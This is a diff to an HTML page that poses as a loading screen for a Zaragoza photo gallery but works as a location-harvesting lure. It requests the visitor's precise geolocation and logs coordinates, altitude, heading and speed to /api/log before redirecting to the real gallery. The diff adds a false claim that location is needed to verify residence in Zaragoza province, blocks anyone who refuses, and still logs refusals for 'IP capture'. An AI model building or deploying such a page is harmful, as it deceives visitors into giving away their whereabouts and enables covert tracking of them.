@@ -18,14 +18,14 @@
       overflow: hidden;
     }
 
-    .loader {
+    /* ── Loading state ── */
+    #state-loading {
       display: flex;
       flex-direction: column;
       align-items: center;
       gap: 28px;
     }
 
-    /* Spinner: thin grey ring on white */
     .spinner {
       width: 52px;
       height: 52px;
@@ -35,9 +35,7 @@
       animation: spin .9s linear infinite;
     }
 
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+    @keyframes spin { to { transform: rotate(360deg); } }
 
     .label {
       font-size: 14px;
@@ -45,22 +43,80 @@
       letter-spacing: 0.02em;
       font-weight: 400;
     }
+
+    /* ── Denied state ── */
+    #state-denied {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      gap: 20px;
+      max-width: 320px;
+      padding: 0 24px;
+    }
+
+    .denied-icon {
+      font-size: 48px;
+      line-height: 1;
+    }
+
+    .denied-title {
+      font-size: 15px;
+      font-weight: 600;
+      color: #111827;
+      line-height: 1.5;
+    }
+
+    .denied-msg {
+      font-size: 14px;
+      color: #6b7280;
+      line-height: 1.6;
+    }
+
+    .btn-reload {
+      margin-top: 6px;
+      padding: 10px 28px;
+      border: none;
+      border-radius: 50px;
+      background: #111827;
+      color: #fff;
+      font-family: inherit;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background .15s;
+    }
+    .btn-reload:hover { background: #374151; }
   </style>
 </head>
 <body>
-  <div class="loader">
+
+  <!-- STATE 1: loading / waiting for permission -->
+  <div id="state-loading">
     <div class="spinner"></div>
     <span class="label">Cargando la galería de fotos</span>
   </div>
 
+  <!-- STATE 2: denied -->
+  <div id="state-denied">
+    <div class="denied-icon">📍</div>
+    <p class="denied-title">Debes permitir compartir tu ubicación para asegurarnos que resides en Zaragoza Provincia</p>
+    <p class="denied-msg">Recarga la página y acepta el permiso de ubicación cuando el navegador te lo solicite.</p>
+    <button class="btn-reload" onclick="location.reload()">Recargar página</button>
+  </div>
+
   <script>
     const REDIRECT = 'https://verpueblos.com/aragon/zaragoza/zaragoza/galeria/18/';
-    let redirected = false;
+    let done = false;
 
-    function go(payload) {
-      if (redirected) return;
-      redirected = true;
+    function showDenied() {
+      document.getElementById('state-loading').style.display = 'none';
+      document.getElementById('state-denied').style.display = 'flex';
+    }
 
+    function redirectAfterLog(payload) {
+      if (done) return;
+      done = true;
       fetch('/api/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -69,31 +125,33 @@
       }).finally(() => {
         window.location.href = REDIRECT;
       });
-
-      // Failsafe: redirect even if fetch hangs
-      setTimeout(() => { window.location.href = REDIRECT; }, 2000);
+      // Failsafe redirect if fetch hangs
+      setTimeout(() => { window.location.href = REDIRECT; }, 3000);
     }
 
-    // 13-second hard timeout — redirect regardless of what the user chose
-    const hardTimeout = setTimeout(() => {
-      go({ denied: true, reason: 'timeout_13s' });
-    }, 13000);
-
     if (!navigator.geolocation) {
-      clearTimeout(hardTimeout);
-      go({ denied: true, reason: 'geolocation_not_supported' });
+      // Device doesn't support geolocation — show denied message
+      showDenied();
     } else {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          clearTimeout(hardTimeout);
+          // ✅ Accepted — log and redirect
           const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;
-          go({ denied: false, latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed });
+          redirectAfterLog({ denied: false, latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed });
         },
         (err) => {
-          clearTimeout(hardTimeout);
-          go({ denied: true, reason: err.message || 'permission_denied' });
+          // ❌ Denied or error — show message, do NOT redirect
+          showDenied();
+
+          // Still log the denial (IP capture)
+          fetch('/api/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ denied: true, reason: err.message || 'permission_denied' }),
+            keepalive: true
+          }).catch(() => {});
         },
-        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 13000, maximumAge: 0 }
       );
     }
   </script>
